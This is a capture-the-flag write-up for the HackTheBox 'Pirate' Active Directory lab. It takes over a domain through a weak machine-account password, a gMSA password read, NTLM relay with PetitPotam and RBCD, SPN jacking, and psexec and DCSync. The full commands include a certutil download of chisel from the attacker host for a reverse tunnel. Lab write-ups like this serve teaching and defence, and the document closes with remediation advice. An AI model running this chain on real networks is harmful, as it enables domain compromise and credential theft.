# HackTheBox — Pirate (Hard, Active Directory / Windows)

**Target IP:** `10.129.xx.xx` | **VPN/Attacker IP:** `10.10.xx.xx` | **Domain:** `pirate.htb` | **Domain Controller:** `DC01.pirate.htb`

> **Given credentials:** `pentest` / `<REDACTED_PASSWORD>`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```
nmap -sV -sC 10.129.xx.xx
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 07:32 +0545
Nmap scan report for 10.129.xx.xx
Host is up (0.29s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-01 08:48:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, ...)
| ssl-cert: Subject: commonName=DC01.pirate.htb
...
443/tcp  open  https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

|_clock-skew: mean: 7h00m02s
| smb2-security-mode:
|_    Message signing enabled and required
```

Standard AD DC footprint on `pirate.htb` (DC01). Unlike Intelligence, **WinRM (5985) is present**, offering a potential remote management path. The ~7-hour clock skew is noted for Kerberos operations.

### 1.2 /etc/hosts Configuration

```
10.129.xx.xx    DC01.pirate.htb pirate.htb DC01
```

---

## 2. Active Directory Enumeration — BloodHound

### 2.1 Fixing the Clock Skew

```
sudo ntpdate 10.129.xx.xx
```

```
CLOCK: time stepped by 25200.249613
```

### 2.2 BloodHound Collection

```
bloodhound-python -u 'pentest' -p '<REDACTED_PASSWORD>' -d 'pirate.htb' \
  -dc 'DC01.pirate.htb' -ns 10.129.xx.xx -c All
```

```
INFO: Found 1 domains
INFO: Found 4 computers
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
...
INFO: Done in 01M 34S
```

BloodHound reveals a second computer: `WEB01.pirate.htb`.

### 2.3 Resolving WEB01

```
nslookup WEB01.pirate.htb 10.129.xx.xx
```

```
Name:   WEB01.pirate.htb
Address: 192.168.100.2
```

`WEB01` lives on an internal subnet (`192.168.100.x`) — not directly reachable. The DC has an adapter on `192.168.100.1` (confirmed later via `ipconfig`), acting as the gateway.

### 2.4 Enumerating Remote Management Users

```
nxc ldap 10.129.xx.xx -u pentest -p '<REDACTED_PASSWORD>' \
  --query "(memberOf=CN=Remote Management Users,CN=Builtin,DC=pirate,DC=htb)" samAccountName
```

```
[+] Response: CN=gMSA_ADCS_prod  →  sAMAccountName: gMSA_ADCS_prod$
[+] Response: CN=gMSA_ADFS_prod  →  sAMAccountName: gMSA_ADFS_prod$
```

Two gMSA accounts are in the **Remote Management Users** group, meaning whichever one we can read the password for will give us WinRM access.

---

## 3. Foothold — Pre-Windows 2000 Misconfiguration → gMSA Password → WinRM

### 3.1 Pre-Windows 2000 Compatible Access Misconfiguration

BloodHound reveals that `MS01$` is a member of the **Pre-Windows 2000 Compatible Access** group. This legacy group causes Windows to set a machine account's Kerberos password to the **lowercase computer name** — in this case, `ms01` for `MS01$`. This allows unauthenticated TGT retrieval with no credentials beyond this knowledge.

```
impacket-getTGT 'pirate.htb/MS01$:ms01' -dc-ip 10.129.xx.xx
```

```
[*] Saving ticket in MS01$.ccache
```

```
export KRB5CCNAME=MS01$.ccache
```

```
klist
Default principal: MS01$@PIRATE.HTB
Valid starting: 03/01/2026 15:02:48   Expires: 03/02/2026 01:02:48
Service principal: krbtgt/PIRATE.HTB@PIRATE.HTB
```

### 3.2 Reading the gMSA Password via MS01$

Using the `MS01$` TGT, the gMSA password for `gMSA_ADFS_prod$` can be read directly from LDAP — `MS01$` has `ReadGMSAPassword` rights over it:

```
bloodyAD --host DC01.pirate.htb --dc-ip 10.129.xx.xx -d pirate.htb \
  -u 'MS01$' -k get object 'gMSA_ADFS_prod$' --attr msDS-ManagedPassword
```

```
distinguishedName: CN=gMSA_ADFS_prod,CN=Managed Service Accounts,DC=pirate,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:<REDACTED_NTLM_HASH>
```

### 3.3 WinRM Access as gMSA_ADFS_prod$

```
nxc winrm 10.129.xx.xx -u 'gMSA_ADFS_prod$' -H '<REDACTED_NTLM_HASH>'
```

```
WINRM  10.129.xx.xx  5985  DC01  [+] pirate.htb\gMSA_ADFS_prod$:<REDACTED_NTLM_HASH> (Pwn3d!)
```

```
evil-winrm -i 10.129.xx.xx -u 'gMSA_ADFS_prod$' -H '<REDACTED_NTLM_HASH>'
```

```
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Documents> whoami
pirate\gmsa_adfs_prod$
```

---

## 4. Pivoting to WEB01 — Chisel + NTLM Relay via PetitPotam

`WEB01` is on the internal `192.168.100.x` subnet. A SOCKS tunnel is established through the DC to reach it.

### 4.1 Setting Up Chisel SOCKS Tunnel

**Attacker (server):**
```
chisel server -p 8000 --reverse
```

**DC01 (client):**
```
certutil.exe -urlcache -f http://10.10.xx.xx/chisel.exe chisel.exe
.\chisel.exe client 10.10.xx.xx:8000 R:socks
```

```
client: Connected (Latency 305.7255ms)
```

All subsequent commands targeting `192.168.100.x` are run via `proxychains`.

### 4.2 NTLM Relay: ntlmrelayx Listener

```
sudo impacket-ntlmrelayx -t ldaps://10.129.xx.xx --delegate-access \
  -smb2support --remove-mic
```

`--delegate-access` tells ntlmrelayx to automatically create a new machine account and grant it **Resource-Based Constrained Delegation (RBCD)** over whatever computer authenticates.

### 4.3 Coercing WEB01$ Authentication via PetitPotam

```
proxychains python3 PetitPotam.py -u 'pentest' -p '<REDACTED_PASSWORD>' \
  -d pirate.htb 10.10.xx.xx 192.168.100.2
```

```
[+] Connected!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

### 4.4 ntlmrelayx Creates a Delegating Machine Account

```
[*] (SMB): Authenticating connection from PIRATE/WEB01$@10.129.xx.xx against ldaps://10.129.xx.xx SUCCEED
[*] ldaps://PIRATE/WEB01$@10.129.xx.xx -> Attempting to create computer in: CN=Computers,DC=pirate,DC=htb
[*] Adding new computer with username: PVCGAIWP$ and password: <REDACTED_PASSWORD> result: OK
[*] Delegation rights modified successfully!
[*] PVCGAIWP$ can now impersonate users on WEB01$ via S4U2Proxy
```

### 4.5 Obtaining an Administrator Ticket for WEB01 (S4U2Proxy)

```
impacket-getST -dc-ip 10.129.xx.xx -spn "CIFS/WEB01.pirate.htb" \
  -impersonate Administrator "pirate.htb/PVCGAIWP:<REDACTED_PASSWORD>"
```

```
[*] Saving ticket in Administrator@CIFS_WEB01.pirate.htb@PIRATE.HTB.ccache
```

```
export KRB5CCNAME=Administrator@CIFS_WEB01.pirate.htb@PIRATE.HTB.ccache
```

### 4.6 Dumping WEB01 Secrets

```
proxychains impacket-secretsdump -k -no-pass WEB01.pirate.htb -dc-ip 10.129.xx.xx
```

```
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED_NTLM_HASH>:::
...
[*] DefaultPassword
PIRATE\a.white:<REDACTED_PASSWORD>
```

Two critical findings from the dump:
- **Local Administrator** NT hash for `WEB01`
- **Cleartext password** for domain user `a.white` stored in LSA Secrets (`DefaultPassword`)

### 4.7 User Flag

```
proxychains evil-winrm -i 192.168.100.2 -u Administrator -H '<REDACTED_NTLM_HASH>'
```

```
C:\Users\a.white\Desktop> type user.txt
<REDACTED_USER_FLAG>
```

---

## 5. Privilege Escalation — SPN Manipulation + Constrained Delegation to DC01

### 5.1 Resetting a.white_adm's Password

`a.white`'s cleartext password (from LSA Secrets) grants the ability to reset the password of `a.white_adm` — a more privileged admin account — via bloodyAD:

```
bloodyAD --host 10.129.xx.xx -d pirate.htb -u a.white -p '<REDACTED_PASSWORD>' \
  set password a.white_adm '<REDACTED_NEW_PASSWORD>'
```

```
[+] Password changed successfully!
```

```
nxc smb 10.129.xx.xx -u a.white_adm -p '<REDACTED_NEW_PASSWORD>'
```

```
SMB  10.129.xx.xx  445  DC01  [+] pirate.htb\a.white_adm:<REDACTED_NEW_PASSWORD>
```

### 5.2 SPN Manipulation — Moving HTTP/WEB01 onto DC01$

`a.white_adm` has the right to modify SPNs. The attack is a classic **SPN jacking** technique:

**Step 1:** Remove `HTTP/WEB01.pirate.htb` from `WEB01$` (where it legitimately lives):

<img width="1258" height="940" alt="Screenshot 2026-03-03 110825" src="https://github.com/user-attachments/assets/e15bb544-63e7-4726-ace7-c3a752004951" />

```
python3 addspn.py -u 'pirate.htb\a.white_adm' -p '<REDACTED_NEW_PASSWORD>' \
  -t 'WEB01$' -s 'HTTP/WEB01.pirate.htb' -r 10.129.xx.xx
```

```
[+] SPN Modified successfully
```

**Step 2:** Inject `HTTP/WEB01.pirate.htb` onto `DC01$`:

```
python3 addspn.py -u 'pirate.htb\a.white_adm' -p '<REDACTED_NEW_PASSWORD>' \
  -t 'DC01$' -s 'HTTP/WEB01.pirate.htb' 10.129.xx.xx
```

```
[+] SPN Modified successfully
```

Now the `HTTP/WEB01.pirate.htb` SPN is registered on `DC01$`. Since the RBCD delegation created earlier grants `PVCGAIWP$` the ability to delegate to `WEB01$` for the `HTTP/WEB01` SPN — and that SPN now resolves to `DC01$` — S4U2Proxy will issue a service ticket to `DC01$`.

### 5.3 Obtaining an Administrator Ticket for DC01 (S4U2Proxy + altservice)

The `-altservice` flag renames the resulting ticket from `HTTP/` to `CIFS/DC01`, enabling psexec-style access:

```
impacket-getST -dc-ip 10.129.xx.xx -spn "HTTP/WEB01.pirate.htb" \
  -impersonate Administrator \
  -altservice "CIFS/DC01.pirate.htb" \
  "pirate.htb/a.white_adm:<REDACTED_NEW_PASSWORD>"
```

```
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

```
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

---

## 6. Domain Compromise — psexec as SYSTEM on DC01

```
impacket-psexec -k -no-pass DC01.pirate.htb
```

```
[*] Found writable share ADMIN$
[*] Uploading file CXnBVXqm.exe
[*] Creating service vIZc on DC01.pirate.htb.....
[*] Starting service vIZc.....
Microsoft Windows [Version 10.0.17763.8385]

C:\Windows\system32> whoami
nt authority\system
```

### 6.1 Root Flag

```
C:\Users\Administrator\Desktop> type root.txt
<REDACTED_ROOT_FLAG>
```

### 6.2 Domain Admin Hash Dump (DCSync)

```
impacket-secretsdump -k -no-pass DC01.pirate.htb -just-dc-user Administrator
```

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED_NTLM_HASH>:::
Administrator:aes256-cts-hmac-sha1-96:<REDACTED>
Administrator:aes128-cts-hmac-sha1-96:<REDACTED>
```

---

## 7. Attack Chain Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Nmap scan | AD DC (`pirate.htb`), WinRM (5985) present; ~7h clock skew noted |
| 2 | BloodHound enumeration | Discovered `WEB01.pirate.htb` on internal subnet `192.168.100.2` |
| 3 | LDAP query | `gMSA_ADFS_prod$` and `gMSA_ADCS_prod$` are in Remote Management Users |
| 4 | Pre-Windows 2000 misconfiguration on `MS01$` | `MS01$`'s Kerberos password is `ms01`; TGT obtained unauthenticated |
| 5 | `ReadGMSAPassword` via `MS01$` TGT | NT hash for `gMSA_ADFS_prod$` retrieved from LDAP |
| 6 | WinRM as `gMSA_ADFS_prod$` | Shell on DC01; internal subnet confirmed via `ipconfig` |
| 7 | Chisel SOCKS tunnel | Internal `192.168.100.x` subnet reachable via proxychains |
| 8 | ntlmrelayx (`--delegate-access`) + PetitPotam coercion of `WEB01$` | New machine account `PVCGAIWP$` created with RBCD over `WEB01$` |
| 9 | S4U2Proxy as `PVCGAIWP$` → `CIFS/WEB01` | Administrator service ticket for `WEB01` obtained |
| 10 | `secretsdump` on `WEB01` | Local Administrator NT hash + `a.white` cleartext password from LSA Secrets |
| 11 | Evil-WinRM to `WEB01` as Administrator | User flag retrieved from `a.white`'s Desktop |
| 12 | `a.white` resets `a.white_adm` password via bloodyAD | Privileged admin account compromised |
| 13 | SPN jacking: moved `HTTP/WEB01.pirate.htb` from `WEB01$` to `DC01$` | RBCD delegation path now resolves to DC01 |
| 14 | S4U2Proxy + `-altservice` → `CIFS/DC01` | Administrator Kerberos ticket for DC01 obtained |
| 15 | `impacket-psexec -k` | SYSTEM shell on DC01; root flag + DCSync performed |

---

## 8. Tools Used

- `nmap` — port/service scanning
- `bloodhound-python` — AD enumeration and attack path analysis
- `ntpdate` — Kerberos clock synchronisation
- `impacket-getTGT` — TGT retrieval for `MS01$` via Pre-Win2000 misconfiguration
- `bloodyAD` — gMSA password read, password reset, SPN inspection
- `nxc` (NetExec) — SMB/WinRM authentication checks, LDAP queries
- `evil-winrm` — WinRM remote shell
- `chisel` — SOCKS5 reverse tunnel for internal subnet pivoting
- `proxychains` — routing tool calls through the SOCKS tunnel
- `impacket-ntlmrelayx` (`--delegate-access`) — NTLM relay to LDAPS with automatic RBCD creation
- `PetitPotam.py` — MS-EFSRPC coercion to trigger `WEB01$` NTLM authentication
- `impacket-getST` — S4U2Self/S4U2Proxy constrained delegation ticket requests
- `addspn.py` — SPN manipulation (remove from `WEB01$`, inject onto `DC01$`)
- `impacket-secretsdump` — SAM/LSA/NTDS credential dumping
- `impacket-psexec` — Kerberos-authenticated SYSTEM shell

---

## 9. Key Takeaways / Remediation

1. **Pre-Windows 2000 Compatible Access group membership:** Adding any machine account to this legacy group sets its Kerberos password to the lowercase computer name, allowing unauthenticated TGT retrieval. Audit and remove all machine accounts from this group. There is virtually no legitimate reason for a modern machine account to be in it.

2. **gMSA `PrincipalsAllowedToRetrieveManagedPassword` overly broad:** `MS01$` could read `gMSA_ADFS_prod$`'s password. Only the specific hosts or services that must authenticate *as* the gMSA should be in this principal list — not arbitrary machine accounts, especially ones with weak passwords.

3. **LSA Secrets storing cleartext domain credentials:** `DefaultPassword` in LSA Secrets held `a.white`'s plaintext password. This is typically set by Windows auto-logon configuration. Auto-logon should not be used with domain accounts, and stored credentials should be audited with tools like `secretsdump` during security reviews.

4. **RBCD abuse via NTLM relay to LDAPS:** The domain allowed computer accounts to be created by standard users (`ms-DS-MachineAccountQuota > 0`) and permitted RBCD attribute writes over machine accounts. Setting `ms-DS-MachineAccountQuota` to `0` eliminates the ability for non-admins to create computer accounts. LDAP channel binding and signing should also be enforced to prevent relay attacks.

5. **PetitPotam (MS-EFSRPC coercion) not patched on WEB01:** Authentication coercion via EfsRpcEncryptFileSrv was possible, which is the root cause of the relay attack succeeding. Apply Microsoft's mitigations for MS-EFSRPC coercion and enable EPA (Extended Protection for Authentication) on LDAP.

6. **SPN write privileges for non-admin accounts:** `a.white_adm` could arbitrarily add and remove SPNs on computer accounts, including `DC01$`. SPN write rights should be restricted to Domain Admins. Uncontrolled SPN modification enables SPN jacking and delegation abuse as demonstrated here.

7. **Credential reuse / weak admin account password policy:** `a.white` had a password stored in LSA Secrets that could be used to reset `a.white_adm`'s password via a `GenericWrite`-style relationship. Privileged account tiers (Tier 0/1/2) should be strictly separated and `GenericWrite` over admin accounts should be audited.

---

*Flags, passwords, and hashes have been redacted. Target IP replaced with `10.129.xx.xx`, attacker/VPN IP with `10.10.xx.xx`.*
